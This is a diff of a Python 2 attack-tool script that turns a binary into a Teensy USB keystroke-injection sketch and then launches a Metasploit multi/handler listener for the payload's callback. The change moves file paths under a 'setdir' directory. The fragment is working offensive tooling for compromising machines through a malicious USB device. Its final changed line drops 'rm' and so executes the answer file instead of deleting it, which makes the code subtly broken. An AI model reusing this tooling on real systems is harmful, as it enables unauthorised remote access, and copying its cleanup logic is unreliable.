@@ -306,22 +306,22 @@ Keyboard.send_now();
 }""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
 # delete temporary file
 subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
-print "   [*] Binary to Teensy file exported as reports/binary2teensy.pde"
+print "   [*] Binary to Teensy file exported as %s/reports/binary2teensy.pde" % (setdir)
 # write the teensy.pde file out
-filewrite = file("reports/binary2teensy.pde", "w")
+filewrite = file(setdir + "/reports/binary2teensy.pde", "w")
 # write the teensy.pde file out
 filewrite.write(output_variable)
 # close the file
 filewrite.close()
 print "   [*] Generating a listener..."
 # create our metasploit answer file
-filewrite = file("src/program_junk/answer.txt", "w")
+filewrite = file(setdir + "/answer.txt", "w")
 filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
 filewrite.close()
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r src/program_junk/answer.txt", shell=True).wait()
+subprocess.Popen("msfconsole -r %s/answer.txt" % (setdir), shell=True).wait()
 print "   [*] Housekeeping old files..."
 # if our answer file is still there (which it should be), then remove it
-if os.path.isfile("src/program_junk/answer.txt"):
+if os.path.isfile(setdir + "/answer.txt"):
     # remove the old file, no longer used once we've exited
-    subprocess.Popen("rm src/program_junk/answer.txt", shell=True).wait()
+    subprocess.Popen(setdir + "/answer.txt", shell=True).wait()
